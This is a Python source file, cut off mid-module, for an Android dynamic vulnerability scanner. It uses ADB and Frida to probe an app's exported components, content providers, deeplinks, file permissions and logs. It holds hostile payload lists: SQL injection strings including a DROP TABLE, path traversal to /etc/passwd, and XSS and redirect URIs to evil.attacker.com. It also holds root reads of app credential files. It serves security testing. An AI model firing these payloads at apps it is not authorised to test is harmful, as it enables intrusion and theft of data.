"""
Dynamic Vulnerability Scanner — testa vulnerabilidades em runtime via ADB.
Inspirado no Drozer, sem precisar instalar nada no dispositivo.

Módulos:
  1. Componentes exportados — tenta iniciar activities, bindar services, enviar broadcasts
  2. Content Providers — tenta query/insert/update/delete sem permissão
  3. Intent Injection — envia intents com dados malformados / path traversal
  4. Backup ADB — verifica se allowBackup=true e tenta extrair dados
  5. Deeplink Hijacking — testa URL schemes sem validação de host
  6. Debuggable — tenta attach via JDWP
  7. Task Hijacking — verifica launchMode vulnerável (singleTask/singleInstance)
  8. Clipboard — monitora se o app escreve dados sensíveis no clipboard
  9. Logcat Leak — captura logs do app em busca de dados sensíveis
 10. File Permissions — verifica arquivos/databases com permissão world-readable/writable
"""
import re
import subprocess
import sys
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

_RESET  = "\033[0m"
_CYAN   = "\033[96m"
_WHITE  = "\033[97m"
_DIM    = "\033[90m"
_BOLD   = "\033[1m"
_YELLOW = "\033[93m"
_RED    = "\033[91m"
_GREEN  = "\033[92m"

RESULTS_DIR  = Path("results")
ANDROID_NS   = "http://schemas.android.com/apk/res/android"

SEV_CRITICAL = "CRITICAL"
SEV_HIGH     = "HIGH"
SEV_MEDIUM   = "MEDIUM"
SEV_LOW      = "LOW"
SEV_INFO     = "INFO"

_SEV_COLOR = {
    SEV_CRITICAL: "\033[91;1m",
    SEV_HIGH:     _RED,
    SEV_MEDIUM:   _YELLOW,
    SEV_LOW:      _CYAN,
    SEV_INFO:     _DIM,
}


# ─── ADB helpers ──────────────────────────────────────────────────────────────

def _adb(adb: str, *args, timeout: int = 15) -> tuple[str, str, int]:
    """Executa comando adb e retorna (stdout, stderr, returncode)."""
    try:
        r = subprocess.run([adb] + list(args), capture_output=True, timeout=timeout)
        return (
            r.stdout.decode("utf-8", errors="replace").strip(),
            r.stderr.decode("utf-8", errors="replace").strip(),
            r.returncode,
        )
    except subprocess.TimeoutExpired:
        return "", "[timeout]", -1
    except Exception as e:
        return "", str(e), -1


def _shell(adb: str, cmd: str, timeout: int = 15) -> str:
    out, _, _ = _adb(adb, "shell", cmd, timeout=timeout)
    return out


def _shell_su(adb: str, cmd: str, timeout: int = 15) -> str:
    out, _, _ = _adb(adb, "shell", "su", "-c", cmd, timeout=timeout)
    return out


def _device_connected(adb: str) -> bool:
    out, _, _ = _adb(adb, "devices", timeout=5)
    return any(
        "device" in line and not line.startswith("List")
        for line in out.splitlines()
    )


def _pkg_installed(adb: str, pkg: str) -> bool:
    out = _shell(adb, f"pm list packages {pkg}")
    return f"package:{pkg}" in out


# ─── Finding ──────────────────────────────────────────────────────────────────

def _f(sev: str, title: str, detail: str, evidence: str = "") -> dict:
    return {"sev": sev, "title": title, "detail": detail, "evidence": evidence}


def _print_finding(f: dict):
    color = _SEV_COLOR.get(f["sev"], _DIM)
    print(f"\n  {color}▸ [{f['sev']}] {f['title']}{_RESET}")
    print(f"    {_WHITE}{f['detail']}{_RESET}")
    if f["evidence"]:
        for line in f["evidence"].splitlines()[:6]:
            print(f"    {_DIM}  {line}{_RESET}")


# ─── Manifest parser ──────────────────────────────────────────────────────────

def _attr(elem, name: str) -> str:
    return elem.get(f"{{{ANDROID_NS}}}{name}", "")


def _parse_manifest(smali_folder: Path) -> dict:
    """
    Extrai do AndroidManifest.xml:
      - package, debuggable, allowBackup, networkSecurityConfig
      - activities, services, receivers, providers (exportados ou não)
      - deeplinks
    """
    manifest_path = smali_folder / "AndroidManifest.xml"
    result = {
        "package": "", "debuggable": False, "allowBackup": True,
        "networkSecurityConfig": False,
        "activities": [], "services": [], "receivers": [], "providers": [],
        "deeplinks": [],
    }
    if not manifest_path.exists():
        return result

    try:
        tree = ET.parse(str(manifest_path))
        root = tree.getroot()
    except Exception:
        return result

    result["package"] = root.get("package", "")
    app = root.find("application")
    if app is None:
        return result

    result["debuggable"]           = _attr(app, "debuggable").lower() == "true"
    result["allowBackup"]          = _attr(app, "allowBackup").lower() != "false"
    result["networkSecurityConfig"] = bool(_attr(app, "networkSecurityConfig"))

    _PLURAL = {
        "activity": "activities",
        "service":  "services",
        "receiver": "receivers",
        "provider": "providers",
    }

    for tag in ("activity", "service", "receiver", "provider"):
        for comp in app.findall(tag):
            name       = _attr(comp, "name")
            exported   = _attr(comp, "exported")
            permission = _attr(comp, "permission")
            read_perm  = _attr(comp, "readPermission")
            write_perm = _attr(comp, "writePermission")
            authorities = _attr(comp, "authorities")
            launch_mode = _attr(comp, "launchMode")

            has_filter  = comp.find("intent-filter") is not None
            is_exported = exported.lower() == "true" or (
                has_filter and exported.lower() != "false"
            )

            # Deeplinks
            for ifilter in comp.findall("intent-filter"):
                has_view = any(
                    _attr(a, "name") == "android.intent.action.VIEW"
                    for a in ifilter.findall("action")
                )
                has_browsable = any(
                    _attr(c, "name") == "android.intent.category.BROWSABLE"
                    for c in ifilter.findall("category")
                )
                if has_view and has_browsable:
                    for data in ifilter.findall("data"):
                        scheme = _attr(data, "scheme")
                        host   = _attr(data, "host")
                        path_v = _attr(data, "path") or _attr(data, "pathPrefix")
                        if scheme:
                            result["deeplinks"].append({
                                "component": name, "scheme": scheme,
                                "host": host, "path": path_v,
                            })

            entry = {
                "name": name, "exported": is_exported,
                "permission": permission, "launch_mode": launch_mode,
                "read_perm": read_perm, "write_perm": write_perm,
                "authorities": authorities,
                "taskAffinity": _attr(comp, "taskAffinity"),
                "allowTaskReparenting": _attr(comp, "allowTaskReparenting"),
            }
            result[_PLURAL[tag]].append(entry)

    return result


# ─── Frida helpers ────────────────────────────────────────────────────────────

def _frida_is_running(pkg: str) -> bool:
    """Verifica se o processo do app está acessível via Frida USB."""
    import shutil
    frida_bin = shutil.which("frida") or "frida"
    try:
        r = subprocess.run(
            [frida_bin, "-U", "-n", pkg, "--eval", "Process.id"],
            capture_output=True, text=True, timeout=8
        )
        return r.returncode == 0 and str(r.stdout).strip().isdigit()
    except Exception:
        return False


def _run_frida_inspector(pkg: str, script_name: str, duration: int = 12) -> list[dict] | None:
    """
    Executa um script Frida de inspeção e coleta os eventos JSON emitidos via send().
    Tenta attach (-n) primeiro; se o processo não estiver rodando, faz spawn (-f).
    Retorna lista de dicts ou None se Frida não estiver disponível/funcionando.
    """
    import shutil, json as _json

    frida_bin = shutil.which("frida") or "frida"
    script_path = Path(__file__).parent.parent / "Fripts" / "Recon" / "vuln" / script_name

    if not script_path.exists():
        return None

    def _run_with_args(args: list) -> tuple[list[dict] | None, str]:
        collected: list[dict] = []
        try:
            proc = subprocess.Popen(
                args,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, encoding="utf-8", errors="replace"
            )
            time.sleep(duration)
            proc.terminate()
            try:
                out_text, err_text = proc.communicate(timeout=5)
            except Exception:
                out_text, err_text = "", ""

            for line in out_text.splitlines():
                line = line.strip()
                if '"type":"send"' in line or '"type": "send"' in line:
                    try:
                        wrapper = _json.loads(line)
                        payload = wrapper.get("payload", "")
                        if isinstance(payload, str) and payload.startswith("{"):
                            collected.append(_json.loads(payload))
                        elif isinstance(payload, dict):
                            collected.append(payload)
                    except Exception:
                        pass
                elif line.startswith("{"):
                    try:
                        collected.append(_json.loads(line))
                    except Exception:
                        pass

            return collected, err_text
        except FileNotFoundError:
            return None, "frida not found"
        except Exception:
            return None, ""

    # Tenta attach primeiro (app já aberto)
    attach_args = [frida_bin, "-U", "-n", pkg, "-l", str(script_path)]
    collected, err_text = _run_with_args(attach_args)

    # Se attach falhou (processo não encontrado), tenta spawn
    if collected is None or (
        not collected and any(k in err_text for k in (
            "Unable to find", "Failed to attach", "process with name",
            "no running process"
        ))
    ):
        spawn_args = [frida_bin, "-U", "-f", pkg, "-l", str(script_path)]
        collected, err_text = _run_with_args(spawn_args)

    if collected is None:
        return None
    if not collected and "Unable to connect" in err_text:
        return None
    if not collected and "Failed to spawn" in err_text:
        return None

    return collected


# ─── Módulo 1: Exported Activities ───────────────────────────────────────────

def test_exported_activities(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [a for a in manifest["activities"] if a["exported"] and not a["permission"]]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando {len(exported)} activit(ies) exportada(s)...{_RESET}")

    for act in exported:
        name = act["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"

        # Tenta iniciar a activity
        out = _shell(adb, f"am start -n {full} 2>&1")
        launched = any(k in out for k in ("Starting:", "Warning:", "Activity"))
        error    = any(k in out for k in ("Error", "Exception", "does not exist",
                                           "Permission Denial", "not found"))

        if launched and not error:
            findings.append(_f(
                SEV_HIGH,
                f"Activity exportada acessível: {name.split('.')[-1]}",
                f"Qualquer app pode iniciar esta activity sem permissão.\n"
                f"Componente: {full}",
                f"am start -n {full}\n→ {out[:200]}"
            ))
        elif "Permission Denial" in out:
            # Exportada mas com permissão em runtime — info
            findings.append(_f(
                SEV_INFO,
                f"Activity exportada (permissão em runtime): {name.split('.')[-1]}",
                f"Exportada mas protegida por permissão em runtime.",
                out[:200]
            ))

    return findings


# ─── Módulo 2: Exported Services ─────────────────────────────────────────────

def test_exported_services(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [s for s in manifest["services"] if s["exported"] and not s["permission"]]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando {len(exported)} service(s) exportado(s)...{_RESET}")

    for svc in exported:
        name = svc["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"
        out  = _shell(adb, f"am startservice -n {full} 2>&1")

        if "Error" not in out and "Exception" not in out and "not found" not in out:
            findings.append(_f(
                SEV_MEDIUM,
                f"Service exportado acessível: {name.split('.')[-1]}",
                f"Qualquer app pode iniciar/bindar este service sem permissão.",
                f"am startservice -n {full}\n→ {out[:200]}"
            ))

    return findings


# ─── Módulo 3: Exported Broadcast Receivers ──────────────────────────────────

def test_exported_receivers(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [r for r in manifest["receivers"] if r["exported"] and not r["permission"]]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando {len(exported)} receiver(s) exportado(s)...{_RESET}")

    for recv in exported:
        name = recv["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"
        out  = _shell(adb, f"am broadcast -n {full} 2>&1")

        if "Broadcast completed" in out or "result=0" in out:
            findings.append(_f(
                SEV_MEDIUM,
                f"Broadcast Receiver acessível: {name.split('.')[-1]}",
                f"Qualquer app pode enviar broadcasts para este receiver.",
                f"am broadcast -n {full}\n→ {out[:200]}"
            ))

    return findings


# ─── Módulo 4: Content Providers ─────────────────────────────────────────────

def test_content_providers(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [
        p for p in manifest["providers"]
        if p["exported"] and not p["permission"]
        and not p["read_perm"] and not p["write_perm"]
        and p["authorities"]
    ]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando {len(exported)} content provider(s)...{_RESET}")

    for prov in exported:
        auth = prov["authorities"].split(";")[0]
        uri  = f"content://{auth}"

        # Query sem permissão
        out = _shell(adb, f"content query --uri {uri} 2>&1", timeout=10)
        if "Exception" not in out and "Permission Denial" not in out and "Error" not in out:
            findings.append(_f(
                SEV_CRITICAL,
                f"Content Provider exposto: {auth}",
                f"Query sem permissão retornou dados. Pode expor informações sensíveis.",
                f"content query --uri {uri}\n→ {out[:400]}"
            ))
            # Tenta path traversal
            for path in ("/../", "/%2F../", "/..%2F"):
                out2 = _shell(adb, f"content query --uri {uri}{path} 2>&1", timeout=8)
                if "Exception" not in out2 and "Error" not in out2 and out2.strip():
                    findings.append(_f(
                        SEV_CRITICAL,
                        f"Content Provider: Path Traversal em {auth}",
                        f"URI com path traversal retornou resposta.",
                        f"content query --uri {uri}{path}\n→ {out2[:300]}"
                    ))
                    break
        elif "Permission Denial" in out:
            findings.append(_f(
                SEV_INFO,
                f"Content Provider exportado (protegido): {auth}",
                "Exportado mas retornou Permission Denial — verifique se todas as URIs estão protegidas.",
                out[:200]
            ))

    return findings


# ─── Módulo 5: Task Hijacking ─────────────────────────────────────────────────

def test_task_hijacking(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    vulnerable_modes = ("singleTask", "singleInstance")

    for act in manifest["activities"]:
        if act["exported"] and act["launch_mode"] in vulnerable_modes:
            findings.append(_f(
                SEV_HIGH,
                f"Task Hijacking: {act['name'].split('.')[-1]}",
                f"Activity exportada com launchMode={act['launch_mode']}. "
                f"Um app malicioso pode inserir uma activity na task stack do app alvo (StrandHogg).",
                f"Componente: {act['name']}\nlaunchMode: {act['launch_mode']}"
            ))

    return findings


# ─── Módulo 6: Backup ADB ─────────────────────────────────────────────────────

def test_adb_backup(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    if not manifest["allowBackup"]:
        return findings

    # Verifica se o backup realmente funciona (não apenas a flag)
    out = _shell(adb, f"pm list packages -f {pkg}")
    if f"package:{pkg}" not in out and pkg not in out:
        return findings

    findings.append(_f(
        SEV_HIGH,
        "Backup ADB habilitado (android:allowBackup=true)",
        f"Dados do app podem ser extraídos via:\n"
        f"  adb backup -f {pkg}.ab -noapk {pkg}\n"
        f"  java -jar abe.jar unpack {pkg}.ab {pkg}.tar\n"
        f"Sem necessidade de root.",
        f"android:allowBackup=true no AndroidManifest.xml"
    ))

    return findings


# ─── Módulo 7: Debuggable ─────────────────────────────────────────────────────

def test_debuggable(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    if not manifest["debuggable"]:
        return findings

    # Confirma em runtime via run-as
    out = _shell(adb, f"run-as {pkg} id 2>&1")
    if "uid=" in out or "Permission" not in out:
        findings.append(_f(
            SEV_CRITICAL,
            "App debuggable em produção",
            f"android:debuggable=true confirmado em runtime.\n"
            f"Permite: attach JDWP, extração de dados via run-as, dump de memória.",
            f"run-as {pkg} id\n→ {out[:200]}"
        ))
    else:
        findings.append(_f(
            SEV_HIGH,
            "android:debuggable=true no Manifest",
            "Flag debuggable presente. Verifique se está ativo em produção.",
            "android:debuggable=true"
        ))

    return findings


# ─── Módulo 8: Deeplink Hijacking ────────────────────────────────────────────

def test_deeplinks(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    if not manifest["deeplinks"]:
        return findings

    print(f"  {_DIM}→ Testando {len(manifest['deeplinks'])} deeplink(s)...{_RESET}")

    for dl in manifest["deeplinks"]:
        scheme = dl["scheme"]
        host   = dl["host"]
        comp   = dl["component"]

        # Scheme sem host = qualquer URL pode acionar
        if not host:
            uri = f"{scheme}://evil.attacker.com/payload"
            out = _shell(adb, f"am start -a android.intent.action.VIEW -d \"{uri}\" 2>&1")
            launched = "Starting:" in out or "Warning:" in out
            findings.append(_f(
                SEV_HIGH if launched else SEV_MEDIUM,
                f"Deeplink sem validação de host: {scheme}://",
                f"Scheme '{scheme}://' sem host fixo. Qualquer URL pode acionar '{comp.split('.')[-1]}'.\n"
                f"Vetor: phishing via link malicioso.",
                f"am start -a VIEW -d \"{uri}\"\n→ {out[:200]}"
            ))
        else:
            # Testa com host diferente do esperado
            uri = f"{scheme}://evil.attacker.com@{host}/payload"
            out = _shell(adb, f"am start -a android.intent.action.VIEW -d \"{uri}\" 2>&1")
            if "Starting:" in out:
                findings.append(_f(
                    SEV_HIGH,
                    f"Deeplink: bypass de validação de host em {scheme}://",
                    f"URI com host forjado ({scheme}://evil@{host}) foi aceita.",
                    f"am start -a VIEW -d \"{uri}\"\n→ {out[:200]}"
                ))

    return findings


# ─── Módulo 9: File Permissions ──────────────────────────────────────────────

def test_file_permissions(adb: str, pkg: str) -> list[dict]:
    findings = []
    print(f"  {_DIM}→ Verificando permissões de arquivos...{_RESET}")

    data_dir = f"/data/data/{pkg}"

    # Verifica se consegue listar sem root (world-readable data dir)
    out_noroot = _shell(adb, f"ls {data_dir} 2>&1")
    if "Permission denied" not in out_noroot and out_noroot.strip():
        findings.append(_f(
            SEV_CRITICAL,
            "Diretório de dados world-readable",
            f"O diretório {data_dir} é acessível sem root.",
            f"ls {data_dir}\n→ {out_noroot[:300]}"
        ))

    # Com root — verifica arquivos world-readable/writable
    out = _shell_su(adb, f"find {data_dir} -type f \\( -perm -o+r -o -perm -o+w \\) 2>/dev/null")
    if out.strip():
        files = [l.strip() for l in out.splitlines() if l.strip()][:10]
        findings.append(_f(
            SEV_HIGH,
            f"Arquivos world-readable/writable ({len(files)}+)",
            f"Arquivos acessíveis por outros apps sem permissão.",
            "\n".join(files)
        ))

    # Databases sem criptografia
    out_db = _shell_su(adb, f"find {data_dir}/databases -name '*.db' 2>/dev/null")
    if out_db.strip():
        dbs = [l.strip() for l in out_db.splitlines() if l.strip()]
        findings.append(_f(
            SEV_MEDIUM,
            f"Banco(s) de dados SQLite encontrado(s) ({len(dbs)})",
            "Verifique se contêm dados sensíveis sem criptografia.",
            "\n".join(dbs[:8])
        ))

    # SharedPreferences em texto claro
    out_sp = _shell_su(adb, f"find {data_dir}/shared_prefs -name '*.xml' 2>/dev/null")
    if out_sp.strip():
        sp_files = [l.strip() for l in out_sp.splitlines() if l.strip()]
        # Lê e verifica se há dados sensíveis
        sensitive_sp = []
        for sp in sp_files[:5]:
            content = _shell_su(adb, f"cat '{sp}' 2>/dev/null")
            if any(k in content.lower() for k in ("password", "token", "secret", "key", "auth")):
                sensitive_sp.append(sp)
        if sensitive_sp:
            findings.append(_f(
                SEV_HIGH,
                f"SharedPreferences com dados sensíveis ({len(sensitive_sp)})",
                "Arquivos XML com possíveis credenciais/tokens em texto claro.",
                "\n".join(sensitive_sp)
            ))

    return findings


# ─── Módulo 10: Logcat Leak ───────────────────────────────────────────────────

def test_logcat_leak(adb: str, pkg: str) -> list[dict]:
    findings = []
    print(f"  {_DIM}→ Capturando logs do app (5s)...{_RESET}")

    # Limpa logcat e captura por 5 segundos
    _adb(adb, "logcat", "-c", timeout=5)
    time.sleep(0.5)

    try:
        proc = subprocess.Popen(
            [adb, "logcat", "-v", "brief", f"--pid=$(pidof {pkg})", "-d"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        time.sleep(5)
        proc.terminate()
        out = proc.stdout.read().decode("utf-8", errors="replace")
    except Exception:
        # Fallback: logcat sem filtro de PID
        out, _, _ = _adb(adb, "logcat", "-d", "-v", "brief", timeout=8)

    if not out.strip():
        return findings

    # Filtra apenas linhas do pacote
    pkg_lines = [l for l in out.splitlines() if pkg in l]
    if not pkg_lines:
        pkg_lines = out.splitlines()[:200]

    # Padrões sensíveis nos logs
    SENSITIVE = [
        (r'(?i)password\s*[=:]\s*\S+',          "Password em log"),
        (r'(?i)token\s*[=:]\s*[A-Za-z0-9+/=]{8,}', "Token em log"),
        (r'(?i)secret\s*[=:]\s*\S+',            "Secret em log"),
        (r'(?i)api[_-]?key\s*[=:]\s*\S+',       "API Key em log"),
        (r'(?i)authorization:\s*\S+',            "Header Authorization em log"),
        (r'eyJ[A-Za-z0-9\-_]{10,}\.',            "JWT em log"),
        (r'(?:AKIA|AGPA)[A-Z0-9]{16}',           "AWS Key em log"),
        (r'(?i)credit.?card|cvv|ssn',            "Dados financeiros em log"),
    ]

    leaked = []
    for line in pkg_lines:
        for pattern, label in SENSITIVE:
            if re.search(pattern, line):
                leaked.append(f"[{label}] {line.strip()[:150]}")
                break

    if leaked:
        findings.append(_f(
            SEV_HIGH,
            f"Dados sensíveis em Logcat ({len(leaked)} ocorrência(s))",
            "O app está logando informações sensíveis acessíveis via adb logcat.",
            "\n".join(leaked[:8])
        ))

    return findings


# ─── Módulo 11: Clipboard Monitor ────────────────────────────────────────────

def test_clipboard(adb: str, pkg: str) -> list[dict]:
    """
    Usa Frida (ui_security_inspector.js) para confirmar dados sensíveis no clipboard.
    Sem Frida: verifica dumpsys clipboard (raramente funciona).
    """
    findings = []

    frida_results = _run_frida_inspector(pkg, "ui_security_inspector.js", duration=10)

    if frida_results is not None:
        for e in frida_results:
            if e.get("type") == "clipboard_sensitive":
                findings.append(_f(
                    SEV_HIGH,
                    "Dado sensível copiado para Clipboard (CONFIRMADO)",
                    "Frida confirmou que o app copiou dado sensível para o clipboard.\n"
                    "Outros apps com permissão READ_CLIPBOARD podem ler este dado.",
                    e["detail"]
                ))
            elif e.get("type") == "clipboard_write":
                findings.append(_f(
                    SEV_INFO,
                    "App escreve no Clipboard",
                    "O app usa ClipboardManager. Dado copiado:\n" + e["detail"],
                ))
    else:
        # Fallback sem Frida
        out = _shell(adb, "dumpsys clipboard 2>/dev/null | head -30")
        if out.strip() and pkg in out:
            findings.append(_f(
                SEV_INFO,
                "App interage com Clipboard (não confirmado via Frida)",
                "Instale Frida para confirmar se dados sensíveis são copiados.",
                out[:200]
            ))

    return findings


# ─── Módulo 12: Network Security ─────────────────────────────────────────────

def test_network_security(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []

    if not manifest["networkSecurityConfig"]:
        # Verifica se o app faz requisições HTTP (cleartext)
        out = _shell(adb, f"dumpsys package {pkg} | grep -i 'cleartextTrafficPermitted\\|usesCleartextTraffic'")
        findings.append(_f(
            SEV_MEDIUM,
            "Network Security Config ausente",
            "Sem configuração explícita, o app pode aceitar tráfego HTTP cleartext (Android < 9).\n"
            "Recomendado: res/xml/network_security_config.xml com cleartextTrafficPermitted=false",
            out[:200] if out.strip() else "networkSecurityConfig não definido no Manifest"
        ))

    # Verifica proxy system (se o app respeita o proxy do sistema)
    proxy_host = _shell(adb, "settings get global http_proxy")
    if proxy_host and proxy_host != "null" and proxy_host.strip():
        out = _shell(adb, f"dumpsys connectivity | grep -i proxy | head -5")
        findings.append(_f(
            SEV_INFO,
            "Proxy do sistema configurado",
            f"Proxy ativo: {proxy_host.strip()}. O app pode ou não respeitar este proxy.",
            out[:200]
        ))

    return findings


# ─── Módulo 13: Intent Injection ─────────────────────────────────────────────

def test_intent_injection(adb: str, pkg: str, manifest: dict) -> list[dict]:
    """
    Usa Frida (intent_inspector.js) para confirmar se extras chegam a sinks perigosos.
    Sem Frida: envia intents e reporta apenas como INFO (não HIGH) pois não há confirmação.
    """
    findings = []
    exported_acts = [a for a in manifest["activities"] if a["exported"] and not a["permission"]]
    if not exported_acts:
        return findings

    print(f"  {_DIM}→ Testando Intent Injection com Frida em {len(exported_acts)} activit(ies)...{_RESET}")

    frida_available = _frida_is_running(pkg)

    # Payloads por categoria de sink
    PAYLOADS = [
        ("--es", "url",      "javascript:alert(1)",                    "XSS/WebView"),
        ("--es", "load",     "file:///data/data/" + pkg + "/databases/","LFI"),
        ("--es", "file",     "../../../../etc/passwd",                  "LFI"),
        ("--es", "redirect", "http://evil.attacker.com",                "Open Redirect"),
        ("--es", "id",       "1' OR '1'='1",                           "SQLi"),
        ("--es", "query",    "' UNION SELECT * FROM sqlite_master--",   "SQLi"),
        ("--ez", "admin",    "true",                                    "IDOR"),
        ("--ez", "is_root",  "true",                                    "IDOR"),
        ("--ei", "user_id",  "-1",                                      "IDOR"),
    ]

    if frida_available:
        # Inicia Frida em background, envia intents, coleta resultados
        import shutil, tempfile, json, threading
        frida_bin = shutil.which("frida") or "frida"
        script_path = Path(__file__).parent.parent / "Fripts" / "Recon" / "vuln" / "intent_inspector.js"

        if not script_path.exists():
            frida_available = False
        else:
            collected: list[dict] = []
            proc = None
            try:
                # Tenta attach primeiro; se falhar, usa spawn
                proc = subprocess.Popen(
                    [frida_bin, "-U", "-n", pkg, "-l", str(script_path)],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    text=True, encoding="utf-8", errors="replace"
                )
                # Verifica se attach funcionou (aguarda 2s e lê stderr)
                time.sleep(2)
                if proc.poll() is not None:
                    # Processo terminou — attach falhou, tenta spawn
                    proc.kill()
                    proc = subprocess.Popen(
                        [frida_bin, "-U", "-f", pkg, "-l", str(script_path)],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        text=True, encoding="utf-8", errors="replace"
                    )
                    time.sleep(3)
                else:
                    time.sleep(1)  # já esperou 2s, aguarda mais 1s

                # Envia payloads
                for act in exported_acts[:4]:
                    name = act["name"]
                    full = name if name.startswith(pkg) else f"{pkg}{name}"
                    for flag, key, val, category in PAYLOADS:
                        _shell(adb, f"am start -n {full} {flag} {key} \"{val}\" 2>&1", timeout=6)
                        time.sleep(0.5)

                time.sleep(3)  # aguarda processamento

                # Lê output Frida
                try:
                    proc.terminate()
                    out_text, _ = proc.communicate(timeout=5)
                    for line in out_text.splitlines():
                        line = line.strip()
                        if line.startswith("{"):
                            try:
                                collected.append(json.loads(line))
                            except Exception:
                                pass
                except Exception:
                    pass
            except Exception:
                frida_available = False
            finally:
                if proc:
                    try: proc.kill()
                    except Exception: pass

            # Analisa confirmações de sink
            SINK_SEV = {
                "sink_webview":   SEV_CRITICAL,
                "sink_sqli":      SEV_CRITICAL,
                "sink_sqli_exec": SEV_CRITICAL,
                "sink_rce":       SEV_CRITICAL,
                "sink_lfi":       SEV_HIGH,
                "sink_redirect":  SEV_HIGH,
                "runtime_exec":   SEV_HIGH,
            }
            seen_sinks: set[str] = set()
            for e in collected:
                t = e.get("type", "")
                if t in SINK_SEV and t not in seen_sinks:
                    seen_sinks.add(t)
                    findings.append(_f(
                        SINK_SEV[t],
                        f"Intent Injection CONFIRMADO: {t.replace('sink_', '').upper()}",
                        f"Frida confirmou que extra chegou ao sink '{t}'.\n" + e["detail"],
                    ))

            if not findings and collected:
                # Extras foram lidos mas não chegaram a sinks perigosos
                extras_read = [e for e in collected if e.get("type") == "extra_read"]
                if extras_read:
                    findings.append(_f(
                        SEV_INFO,
                        f"Extras recebidos mas sem sink perigoso confirmado ({len(extras_read)} extra(s))",
                        "O app leu os extras injetados mas Frida não detectou uso em sinks perigosos.\n"
                        "Pode haver validação adequada ou o sink não foi coberto.",
                        "\n".join(e["detail"] for e in extras_read[:5])
                    ))
            return findings

    # Sem Frida — envia intents e reporta apenas como INFO
    for act in exported_acts[:4]:
        name = act["name"]
        full = name if name.startswith(pkg) else f"{pkg}{name}"
        for flag, key, val, category in PAYLOADS[:4]:
            out = _shell(adb, f"am start -n {full} {flag} {key} \"{val}\" 2>&1", timeout=6)
            if "Starting:" in out and "Error" not in out:
                findings.append(_f(
                    SEV_INFO,
                    f"Intent aceito (não confirmado): {name.split('.')[-1]} — {category}",
                    f"Activity abriu com payload '{val}' mas sem Frida não é possível confirmar\n"
                    f"se o valor chegou a um sink perigoso. Instale Frida para confirmação.\n"
                    f"Payload: {flag} {key} \"{val}\"",
                    f"am start -n {full} {flag} {key} \"{val}\"\n→ {out[:150]}"
                ))
                break  # um por activity

    return findings


# ─── Módulo 14: SQL Injection em Content Providers ───────────────────────────

def test_sqli_providers(adb: str, pkg: str, manifest: dict) -> list[dict]:
    findings = []
    exported = [
        p for p in manifest["providers"]
        if p["exported"] and not p["permission"]
        and not p["read_perm"] and not p["write_perm"]
        and p["authorities"]
    ]
    if not exported:
        return findings

    print(f"  {_DIM}→ Testando SQLi em {len(exported)} provider(s)...{_RESET}")

    SQLI_PAYLOADS = [
        "1' OR '1'='1",
        "1' OR '1'='1'--",
        "1' UNION SELECT NULL--",
        "1'; DROP TABLE users--",
        "admin'--",
        "' OR 1=1--",
    ]

    for prov in exported:
        auth = prov["authorities"].split(";")[0]
        base_uri = f"content://{auth}"
        
        # Tenta injeção na URI
        for payload in SQLI_PAYLOADS[:3]:
            uri = f"{base_uri}/{payload}"
            out = _shell(adb, f"content query --uri \"{uri}\" 2>&1", timeout=10)
            
            # Indicadores de SQLi
            if any(indicator in out.lower() for indicator in [
                "sqlite", "syntax error", "unrecognized token",
                "no such column", "no such table", "near \"",
            ]):
                findings.append(_f(
                    SEV_CRITICAL,
                    f"SQL Injection em Content Provider: {auth}",
                    f"Provider retornou erro SQL indicando injeção bem-sucedida.\n"
                    f"Payload: {payload}",
                    f"content query --uri \"{uri}\"\n→ {out[:400]}"
                ))
                break

        # Testa projection injection
        out = _shell(adb, f"content query --uri {base_uri} --projection \"* FROM sqlite_master--\" 2>&1", timeout=10)
        if "sqlite_master" in out.lower() or "table" in out.lower():
            findings.append(_f(
                SEV_CRITICAL,
                f"SQL Injection via projection em {auth}",
                "Injeção via parâmetro --projection permite dump de schema.",
                f"content query --uri {base_uri} --projection \"* FROM sqlite_master--\"\n→ {out[:400]}"
            ))

    return findings


# ─── Módulo 15: Tapjacking ───────────────────────────────────────────────────

def test_tapjacking(adb: str, pkg: str, manifest: dict) -> list[dict]:
    """
    Usa Frida (ui_security_inspector.js) para confirmar FLAG_SECURE em runtime.
    Sem Frida: apenas reporta activities com nome sensível como INFO (não HIGH).
    """
    findings = []

    critical_keywords = ["login", "password", "payment", "transfer", "confirm", "auth",
                         "pin", "otp", "wallet", "checkout", "credit"]
    critical_acts = [
        a for a in manifest["activities"]
        if any(kw in a["name"].lower() for kw in critical_keywords)
    ]
    if not critical_acts:
        return findings

    print(f"  {_DIM}→ Verificando FLAG_SECURE via Frida em {len(critical_acts)} activit(ies)...{_RESET}")

    frida_results = _run_frida_inspector(pkg, "ui_security_inspector.js", duration=12)

    if frida_results is None:
        # Frida não disponível — reporta como INFO sem confirmação
        for act in critical_acts:
            findings.append(_f(
                SEV_INFO,
                f"Activity sensível — FLAG_SECURE não verificado: {act['name'].split('.')[-1]}",
                f"Frida não disponível para confirmar. Verifique manualmente se usa FLAG_SECURE.\n"
                f"Componente: {act['name']}",
            ))
        return findings

    # Analisa eventos Frida
    secure_set   = {e["detail"] for e in frida_results if e.get("type") in ("flag_secure_set", "flag_secure_added")}
    secure_miss  = [e for e in frida_results if e.get("type") == "missing_flag_secure"]
    secure_removed = [e for e in frida_results if e.get("type") == "flag_secure_removed"]

    for e in secure_miss:
        act_name = e["detail"].split(":")[1].strip().split("\n")[0] if ":" in e["detail"] else "unknown"
        findings.append(_f(
